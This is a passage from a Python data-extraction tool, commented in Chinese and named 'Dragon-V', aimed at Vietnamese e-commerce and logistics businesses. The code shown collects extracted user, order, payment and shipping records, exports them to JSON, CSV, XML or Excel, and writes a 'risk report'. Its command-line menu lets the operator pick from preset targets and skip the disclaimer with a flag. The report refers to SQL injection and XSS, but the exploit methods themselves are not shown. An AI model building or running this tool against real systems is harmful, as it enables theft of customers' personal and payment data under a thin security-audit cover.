                extraction_result['extractions'].extend(extractions)
                extraction_result['vietnam_specific_data'].extend([e for e in extractions if e.get('success', False)])
                successful_extractions += len([e for e in extractions if e.get('success', False)])
            except Exception as e:
                logger.error(f"越南数据提取方法异常 {method_name}: {str(e)}")

        # 统计结果
        extraction_result['total_data_extracted'] = len(extraction_result['extractions'])
        extraction_result['success_rate'] = round(successful_extractions / len(extraction_methods) * 100, 2) if extraction_methods else 0

        # 越南特色风险评估
        if successful_extractions >= 4:
            extraction_result['risk_assessment'] = 'HIGH'
            extraction_result['next_actions'] = [
                '立即修补越南业务漏洞',
                '加强越南用户数据保护',
                '实施越南本地安全监控',
                '进行越南业务安全审计'
            ]
        elif successful_extractions >= 2:
            extraction_result['risk_assessment'] = 'MEDIUM'
            extraction_result['next_actions'] = [
                '修复越南业务中等风险漏洞',
                '加强越南输入验证',
                '定期越南业务安全扫描'
            ]
        else:
            extraction_result['risk_assessment'] = 'LOW'
            extraction_result['next_actions'] = [
                '保持越南业务安全检查',
                '及时更新越南业务安全补丁'
            ]

        # 保存提取的数据
        self._save_vietnam_extracted_data(extraction_result)

        logger.info(f"对 {target['target_name']} 的越南业务数据提取完成")

        return extraction_result

    def _save_vietnam_extracted_data(self, extraction_result: Dict[str, Any]):
        """保存越南提取的数据"""
        for extraction in extraction_result['vietnam_specific_data']:
            if extraction.get('success', False):
                data_type = extraction.get('data_type', 'unknown')
                if data_type == 'vietnam_users':
                    self.extracted_data['vietnam_users'].extend(extraction['extracted_data']['users'])
                elif data_type == 'vietnam_orders':
                    self.extracted_data['vietnam_orders'].extend(extraction['extracted_data']['orders'])
                elif data_type == 'vietnam_products':
                    self.extracted_data['vietnam_products'].extend(extraction['extracted_data']['products'])
                elif data_type == 'vietnam_payments':
                    self.extracted_data['vietnam_payments'].extend(extraction['extracted_data']['payments'])
                elif data_type == 'vietnam_logistics':
                    self.extracted_data['vietnam_logistics'].extend(extraction['extracted_data']['logistics'])
                elif data_type == 'vietnam_shipping':
                    self.extracted_data['vietnam_shipping'].extend(extraction['extracted_data']['shipping'])

    def export_vietnam_data(self, output_format: str = 'json', filename: str = None) -> str:
        """导出越南数据"""
        if filename is None:
            filename = f"vietnam_extracted_data_{datetime.now().strftime('%Y%m%d_%H%M%S')}"

        filename += f".{output_format}"

        try:
            if output_format == 'json':
                with open(filename, 'w', encoding='utf-8') as f:
                    json.dump(self.extracted_data, f, ensure_ascii=False, indent=2)

            elif output_format == 'csv':
                # 导出越南用户数据
                for data_type, data_list in self.extracted_data.items():
                    if data_list:
                        csv_filename = f"{filename.replace('.csv', f'_{data_type}.csv')}"
                        with open(csv_filename, 'w', newline='', encoding='utf-8') as f:
                            if data_list:
                                writer = csv.DictWriter(f, fieldnames=data_list[0].keys())
                                writer.writeheader()
                                writer.writerows(data_list)

            elif output_format == 'xml':
                root = ET.Element('VietnamExtractedData')
                for data_type, data_list in self.extracted_data.items():
                    type_elem = ET.SubElement(root, data_type)
                    for item in data_list:
                        item_elem = ET.SubElement(type_elem, 'item')
                        for key, value in item.items():
                            elem = ET.SubElement(item_elem, key)
                            elem.text = str(value)

                tree = ET.ElementTree(root)
                tree.write(filename, encoding='utf-8', xml_declaration=True)

            elif output_format == 'excel':
                # 创建Excel文件
                with pd.ExcelWriter(filename, engine='openpyxl') as writer:
                    for data_type, data_list in self.extracted_data.items():
                        if data_list:
                            df = pd.DataFrame(data_list)
                            df.to_excel(writer, sheet_name=data_type, index=False)

            logger.info(f"越南数据导出成功: {filename}")
            return filename

        except Exception as e:
            logger.error(f"越南数据导出失败: {str(e)}")
            return None

    def create_vietnam_comprehensive_report(self, extraction_results: List[Dict[str, Any]]) -> str:
        """创建越南业务综合报告"""
        report = []
        report.append("="*100)
        report.append("Dragon-V 越南业务数据提取工具报告")
        report.append("="*100)
        report.append(f"工具版本: {self.version}")
        report.append(f"生成时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        report.append(f"越南目标数量: {len(extraction_results)}")
        report.append("")

        # 统计信息
        total_extractions = 0
        successful_extractions = 0
        high_risk_targets = 0

        for result in extraction_results:
            total_extractions += result['total_data_extracted']
            successful_extractions += len([e for e in result['extractions'] if e.get('success', False)])
            if result['risk_assessment'] == 'HIGH':
                high_risk_targets += 1

        report.append("【越南业务统计摘要】")
        report.append("-"*60)
        report.append(f"总提取次数: {total_extractions}")
        report.append(f"成功提取次数: {successful_extractions}")
        report.append(f"高风险越南目标: {high_risk_targets}")
        report.append(f"越南业务成功率: {round(successful_extractions/total_extractions*100, 2) if total_extractions > 0 else 0}%")
        report.append("")

        # 越南业务数据统计
        report.append("【越南业务数据统计】")
        report.append("-"*60)
        report.append(f"越南用户数据: {len(self.extracted_data['vietnam_users'])} 条")
        report.append(f"越南订单数据: {len(self.extracted_data['vietnam_orders'])} 条")
        report.append(f"越南产品数据: {len(self.extracted_data['vietnam_products'])} 条")
        report.append(f"越南支付数据: {len(self.extracted_data['vietnam_payments'])} 条")
        report.append(f"越南物流数据: {len(self.extracted_data['vietnam_logistics'])} 条")
        report.append(f"越南配送数据: {len(self.extracted_data['vietnam_shipping'])} 条")
        report.append("")

        # 详细结果
        report.append("【越南业务详细提取结果】")
        report.append("-"*60)

        for i, result in enumerate(extraction_results, 1):
            report.append(f"\n越南目标 #{i}: {result['target_name']}")
            report.append(f"风险等级: {result['risk_assessment']}")
            report.append(f"提取次数: {result['total_data_extracted']}")
            report.append(f"成功率: {result['success_rate']}%")
            report.append(f"数据源: {', '.join(result['target_info']['data_sources'])}")
            report.append("")

            for j, extraction in enumerate(result['extractions'], 1):
                if extraction.get('success', False):
                    report.append(f"  提取 #{j}: {extraction['type']}")
                    report.append(f"    方法: {extraction['method']}")
                    report.append(f"    数据类型: {extraction['data_type']}")
                    report.append(f"    描述: {extraction['description']}")
                    report.append("")

        report.append("【越南业务特色建议】")
        report.append("-"*60)

        if high_risk_targets > 0:
            report.append("⚠️ 发现高风险越南业务系统，建议立即采取以下措施:")
            report.append("1. 立即修补越南业务SQL注入和XSS漏洞")
            report.append("2. 加强越南用户数据保护和隐私合规")
            report.append("3. 实施越南本地化安全监控和WAF")
            report.append("4. 进行越南业务合规性审计")
            report.append("5. 加强越南业务访问控制和权限管理")
        else:
            report.append("✅ 越南业务安全状况良好，建议:")
            report.append("1. 保持越南业务定期安全检查")
            report.append("2. 及时更新越南业务安全补丁")
            report.append("3. 进行越南业务员工安全意识培训")
            report.append("4. 实施越南业务安全监控和日志记录")
            report.append("5. 遵守越南数据保护法规")

        report.append("")
        report.append("="*100)
        report.append("越南业务报告生成完成")

        # 保存报告
        report_filename = f"vietnam_extraction_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(report_filename, 'w', encoding='utf-8') as f:
            f.write('\n'.join(report))

        logger.info(f"越南业务报告生成: {report_filename}")
        return report_filename

    def run_vietnam_extraction(self, target_name: str, target_url: str):
        """运行越南数据提取"""
        # 显示免责声明
        if not self.show_disclaimer():
            print("您必须接受免责声明才能继续使用。")
            return

        # 查找越南目标
        target = next((t for t in self.vietnam_targets if t['name'] == target_name), None)
        if not target:
            print(f"未找到越南目标: {target_name}")
            return

        # 验证目标
        target['url'] = target_url
        validated_target = self.validate_vietnam_target(target)

        # 执行越南数据提取
        print(f"\n开始对 {target_name} 进行越南业务数据提取...")

        extraction_result = self.perform_vietnam_data_extraction(validated_target)

        # 显示结果
        print("\n" + "="*80)
        print("越南业务数据提取结果")
        print("="*80)
        print(f"目标名称: {extraction_result['target_name']}")
        print(f"目标URL: {extraction_result['target_url']}")
        print(f"风险等级: {extraction_result['risk_assessment']}")
        print(f"总提取次数: {extraction_result['total_data_extracted']}")
        print(f"成功率: {extraction_result['success_rate']}%")
        print("")

        # 显示详细的提取结果
        for i, extraction in enumerate(extraction_result['extractions'], 1):
            print(f"越南提取 #{i}:")
            print(f"  类型: {extraction['type']}")
            print(f"  方法: {extraction['method']}")
            print(f"  数据类型: {extraction['data_type']}")
            print(f"  描述: {extraction['description']}")
            if extraction.get('success', False):
                print(f"  状态: [成功]")
                print(f"  提取的越南数据: {extraction['extracted_data']}")
            else:
                print(f"  状态: [失败]")
            print("")

        # 导出越南数据
        print("选择越南数据导出格式:")
        print("1. JSON")
        print("2. CSV")
        print("3. XML")
        print("4. Excel")
        print("5. 不导出")

        choice = input("请选择 (1-5): ").strip()

        export_formats = {
            '1': 'json',
            '2': 'csv',
            '3': 'xml',
            '4': 'excel'
        }

        if choice in export_formats:
            filename = self.export_vietnam_data(export_formats[choice])
            if filename:
                print(f"越南数据导出成功: {filename}")
            else:
                print("越南数据导出失败")
        elif choice == '5':
            print("跳过越南数据导出")
        else:
            print("无效选择")

        # 生成越南报告
        report_filename = self.create_vietnam_comprehensive_report([extraction_result])
        print(f"越南业务报告生成: {report_filename}")

def main():
    """主函数"""
    import argparse

    parser = argparse.ArgumentParser(description='Dragon-V 增强越南业务数据提取工具')
    parser.add_argument('--target', type=str, help='越南目标名称')
    parser.add_argument('--url', type=str, help='越南目标URL')
    parser.add_argument('--disclaimer', action='store_true', help='自动接受免责声明')

    args = parser.parse_args()

    # 创建工具实例
    extractor = EnhancedVietnamDataExtractor()

    # 如果需要自动接受免责声明
    if args.disclaimer:
        extractor.disclaimer_accepted = True

    if args.target and args.url:
        # 直接执行越南数据提取
        extractor.run_vietnam_extraction(args.target, args.url)
    else:
        # 提供目标选择
        print("越南业务数据提取工具")
        print("="*80)
        print("可用越南目标:")
        for i, target in enumerate(extractor.vietnam_targets, 1):
            print(f"{i}. {target['name']} - {target['url']}")

        choice = input("\n请选择越南目标 (1-6): ").strip()
        try:
            index = int(choice) - 1
            if 0 <= index < len(extractor.vietnam_targets):
                target = extractor.vietnam_targets[index]
                extractor.run_vietnam_extraction(target['name'], target['url'])
            else:
                print("无效选择")
        except ValueError:
            print("请输入有效的数字")

if __name__ == "__main__":
    main()